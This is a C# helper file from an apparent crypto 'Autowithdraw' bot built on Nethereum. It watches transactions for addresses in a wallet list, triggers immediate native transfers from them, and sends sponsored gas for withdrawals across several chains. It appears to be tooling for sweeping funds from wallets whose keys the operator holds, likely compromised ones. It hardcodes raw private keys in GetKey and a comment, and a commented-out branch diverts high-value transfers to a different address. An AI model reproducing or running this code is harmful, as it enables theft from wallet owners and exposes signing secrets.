using Autowithdraw.Global.Common;
using Autowithdraw.Global.Objects;
using Autowithdraw.Main.Actions;
using Nethereum.Contracts;
using Nethereum.Hex.HexTypes;
using Nethereum.JsonRpc.Client;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.Signer;
using Nethereum.Web3;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Numerics;
using System.Threading;
using System.Threading.Tasks;
using Account = Nethereum.Web3.Accounts.Account;

namespace Autowithdraw.Global
{
    internal class Helper
    {
        public static bool AddNonce(Exception e) => e.Message.Contains("already known") || e.Message.Contains("underpriced") || e.Message.Contains("nonce too low");

        public static DateTime UnixTimeStampToDateTime(double unixTimeStamp)
        {
            DateTime dateTime = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc).AddHours(3);
            dateTime = dateTime.AddSeconds(unixTimeStamp);
            return dateTime;
        }

        public static async Task<ResultStake> ResultStake(Stakes Stake)
        {
            var Contract = new ContractHelper(Stake.Address, Stake.ContractAddress, Settings.Chains[56].Web3);
            BigInteger Amount = -1000000000;
            int Destination = 0;
            if (Stake.Name == "SFUND")
            {
                var calculate = await Contract.Contract.GetFunction("calculate").CallAsync<BigInteger>(Stake.Address);
                var userDeposits = await Contract.Contract.GetFunction("userDeposits")
                    .CallDeserializingToObjectAsync<userDeposits>(Stake.Address);
                Amount = userDeposits.Amount + calculate;
                Destination = userDeposits.End;
            }

            if (Stake.Name == "CAKE")
            {
                var userInfo = await Contract.Contract.GetFunction("userInfo")
                    .CallDeserializingToObjectAsync<userInfo>(Stake.Address);
                Amount = Web3.Convert.ToWei(Stake.Amount);
                Destination = userInfo.End;
            }

            return new ResultStake
            {
                Amount = Amount,
                End = Destination
            };
        }

        public static BigInteger GetWeiTime()
        {
            DateTime Date = DateTime.UtcNow;
            return int.Parse($"{Date:hmm}");
        }

        public static BigInteger GetWei(bool Double = false) => Settings.Config.Wei == 0 ? (Double ? GetWeiTime() * 2 : GetWeiTime()) : (Double ? Settings.Config.Wei * 2 : Settings.Config.Wei);

        public static List<T[]> Chunk<T>(
            T[] original,
            int n)
        {
            List<T[]> result = new List<T[]>();

            for (int i = 0; i < n; i++)
            {
                int min = i * original.Length / n;
                int max = (i + 1) * original.Length / n;

                result.Add(original[min..max]);
            }

            return result;
        }

        public static RandomKey GenerateKey()
        {
            EthECKey ecKey = EthECKey.GenerateKey();
            Account Account = new Account(ecKey);

            return new RandomKey { Address = Account.Address, PrivateKey = ecKey.GetPrivateKey() };
        }

        public static string GetSymbol(float Price, int ChainID, bool Proxy = false)
        {
            string Symbol = "🟩";
            switch (ChainID)
            {
                case 1:
                    if (!Proxy)
                    {
                        if (Price < 270)
                            Symbol = "🟨";
                        if (Price < 150)
                            Symbol = "🟥";
                    }
                    else
                    {
                        if (Price <= 10)
                            Symbol = "🟨";
                        if (Price <= 3)
                            Symbol = "🟥";
                    }
                    break;
                case 56:
                    if (!Proxy)
                    {
                        if (Price < 130)
                            Symbol = "🟨";
                        if (Price < 70)
                            Symbol = "🟥";
                    }
                    else
                    {
                        if (Price < 150)
                            Symbol = "🟨";
                        if (Price < 120)
                            Symbol = "🟥";
                    }
                    break;
                case 137:
                    if (!Proxy)
                    {
                        if (Price < 270)
                            Symbol = "🟨";
                        if (Price < 150)
                            Symbol = "🟥";
                    }
                    else
                    {
                        if (Price < 150)
                            Symbol = "🟨";
                        if (Price < 120)
                            Symbol = "🟥";
                    }
                    break;
                case 42161:
                    if (!Proxy)
                    {
                        if (Price < 10)
                            Symbol = "🟨";
                        if (Price <= 1)
                            Symbol = "🟥";
                    }
                    else
                    {
                        if (Price <= 10)
                            Symbol = "🟥";
                    }
                    break;
                case 128:
                    if (!Proxy)
                    {
                        if (Price < 10)
                            Symbol = "🟨";
                        if (Price <= 1)
                            Symbol = "🟥";
                    }
                    else
                    {
                        if (Price <= 10)
                            Symbol = "🟥";
                    }
                    break;
                case 43114:
                    if (!Proxy)
                    {
                        if (Price < 10)
                            Symbol = "🟨";
                        if (Price <= 1)
                            Symbol = "🟥";
                    }
                    else
                    {
                        if (Price <= 10)
                            Symbol = "🟥";
                    }
                    break;
            }

            return Symbol;
        }

        public static string GetKey(float Price, string Address, int ChainID)
        {
            /*if (Price >= 155000 && Settings.Start && Address != "0x94Bdd603e222A2aE72831B418e3C45661b662B54")
            {
                return "0x92a03dd3956ad93e0d71b7496d0c95fb6e94522565cdb06cfdb03f10f80b7cad";
            }*/

            if (ChainID == 56)
            {
                return "0x4cff59a2f97065691ba65eb54ac6eded1282caeb6a4e5bd02a3799b15b6144ce";
            }

            return Settings.Chains[1].Contract.PrivateKey;
        }

        public static string GetAddress(float Price, string Address, string Recipient)
        {
            /*if (Price >= 155000 && Settings.Start && Address != "0x94Bdd603e222A2aE72831B418e3C45661b662B54")
            {
                return "0x9cD640Cb53c5af0158742fb1dff7CE2939Ff425E";
            }*/

            return Recipient;
        }

        public static string GetMethod(string Data)
        {
            string Method;
            try
            {
                Method = Network.Get("https://raw.githubusercontent.com/ethereum-lists/4bytes/master/signatures/" +
                                     Data.Substring(0, 10).Substring(2)).Split('(')[0];
                if (Method == "404: Not Found")
                    throw new Exception("Not found");
            }
            catch
            {
                Method = "Unknown";
            }
            return Method;
        }

        private static string _SplitInt(double Integer) => Integer.ToString("#,#", new CultureInfo("de-DE"));
        public static string SplitInt(double Integer) => string.IsNullOrEmpty(_SplitInt(Integer)) ? "0" : _SplitInt(Integer);

        public static async Task Internal(
            string Input,
            string ContractAddress,
            int ChainID)
        {
            if (Settings.Chains[ChainID].Contract != null && Settings.Chains[ChainID].Contract.ContractAddress != null)
                if (ContractAddress == Settings.Chains[ChainID].Contract.ContractAddress || ExecuteTransaction.Executing.Contains(ContractAddress))
                    return;
            for (int i = 0; i < Input.Length; i++)
            {
                try
                {
                    string Address = Input[i..(i + 40)];
                    if (Address.StartsWith("000") || Address.EndsWith("000") ||
                        Address.StartsWith("fff") || Address.EndsWith("fff") ||
                        Address.Split('0').Length > 8 ||
                        Address.Split('f').Length > 8) continue;
                    Address = Web3.ToChecksumAddress(Address);
                    if (Settings.Wallets.ContainsKey(Address) && !Transfer.Busy.Contains(Address))
                    {
                        await Task.Factory.StartNew(() =>
                            Transfer.Native(Address, 0, ChainID, true));
                        Transfer.Busy.Add(Address);
                        Thread.Sleep(1000 * 60);
                    }
                }
                catch
                {
                    // ignored
                }
            }
        }

        public static float DollarsInHour;
        public static List<string> Addresses = new List<string>();

        public static async Task<string> TransferGas(
            string Address,
            int ChainID,
            float amount = 0.24f,
            bool fromTelegram = false,
            bool fromAutoApprove = false)
        {
            string txHash = "";
            if (string.IsNullOrEmpty(Settings.Chains[ChainID].Contract.ContractAddress) || Flashbots.Withdrawing.Contains(Address))
            {
                return "";
            }

            if (DollarsInHour > 20)
            {
                //await Network.SendTelegram($"Transfer to {Settings.Chains[ChainID].Name} <a href=\"https://{Settings.Chains[ChainID].Link}/address/{Address}\">{Address}</a> paused. Because sponsored transactions more price 20$ in hour (Security)");
                //return "";
            }

            if (amount >= 0.7 && !fromTelegram)
            {
                Logger.Debug($"Approve/Transfer for Address {Address} high the normal");
                return "";
            }

            if (fromTelegram)
            {
                if (Addresses.Contains(Address))
                    return "";

                Addresses.Add(Address);

                new Thread(() =>
                {
                    Thread.Sleep(10000);
                    Addresses.Remove(Address);
                }).Start();
            }

            Web3 Account = new Web3(new Account(Settings.Chains[ChainID].Contract.PrivateKey, ChainID),
                Settings.Chains[ChainID].HTTPClient);

            var Contract = Account.Eth.GetContract(Settings.Chains[ChainID].Contract.ABI, Settings.Chains[ChainID].Contract.ContractAddress);

            Function sendTo = Contract.GetFunction("sendTo");
            BigInteger Wei = Web3.Convert.ToWei(Pricing.GetEther(amount, ChainID)) + 100;

            TransactionInput TX = new TransactionInput
            {
                From = Settings.Chains[ChainID].Contract.Sponsor,
                Gas = await sendTo.EstimateGasAsync(Settings.Chains[ChainID].Contract.Sponsor, null, new HexBigInteger(Wei), Address),
                Value = new HexBigInteger(Wei),
                GasPrice = new HexBigInteger(await Pricing.GetGwei(ChainID))
            };

            for (int i = 0; i < 5; i++)
            {
                try
                {
                    TX.Nonce = await Account.Eth.Transactions.GetTransactionCount.SendRequestAsync(Settings.Chains[ChainID].Contract.Sponsor, BlockParameter.BlockParameterType.latest);
                    txHash = await sendTo.SendTransactionAsync(TX, Address);
                    if (!fromTelegram)
                    {
                        Settings.Stats.AddSponsoredSpend(amount);

                        if (!fromAutoApprove)
                        {
                            try
                            {
                                await Account.TransactionManager.SendTransactionAsync(new TransactionInput
                                {
                                    From = Settings.Chains[ChainID].Contract.Sponsor,
                                    Gas = new HexBigInteger(Settings.Chains[ChainID].DefaultGas),
                                    GasPrice = new HexBigInteger(await Pricing.GetGwei(ChainID)),
                                    Value = new HexBigInteger(Wei / 2),
                                    To = Address,
                                    Nonce = new HexBigInteger(TX.Nonce.Value + 1)
                                });
                            }
                            catch
                            {
                                // ignored
                            }
                        }
                        DollarsInHour += amount + Pricing.GetPrice(TX.Gas * TX.GasPrice.Value, ChainID) + Pricing.GetPrice(await Pricing.GetGwei(ChainID) * Settings.Chains[ChainID].DefaultGas, ChainID);
                    }
                    break;
                }
                catch (Exception e)
                {
                    if (e.Message.Contains("insufficient"))
                        await Network.SendTelegram($"Sponsor in {Settings.Chains[ChainID].Name} not have funds - {Settings.Chains[ChainID].Contract.Sponsor}");
                }
                Thread.Sleep(3500);
            }
            return txHash;
        }

        public static async Task<TransactionReceipt> WaitForTransactionReceipt(string transactionHash, int ChainID, bool isImportant = false)
        {
            try
            {
                Web3 W3 = Settings.Chains[ChainID].Web3;
                if (!isImportant)
                    Thread.Sleep(500); // 3500
                var receipt = await W3.Eth.Transactions.GetTransactionReceipt.SendRequestAsync(transactionHash);
                int index = 0;

                while (receipt == null && index < (ChainID == 56 ? isImportant ? 15 : 1 : 40) * 10)
                {
                    Thread.Sleep(isImportant ? 50 : 1500); // 3000
                    receipt = await W3.Eth.Transactions.GetTransactionReceipt.SendRequestAsync(transactionHash);
                    index++;
                }

                return receipt;
            }
            catch (RpcClientTimeoutException)
            {
                Logger.Error($"Timeout {ChainID} {transactionHash}");
            }
            catch (Exception e) { Logger.Error(e); }

            return null;
        }
    }
}
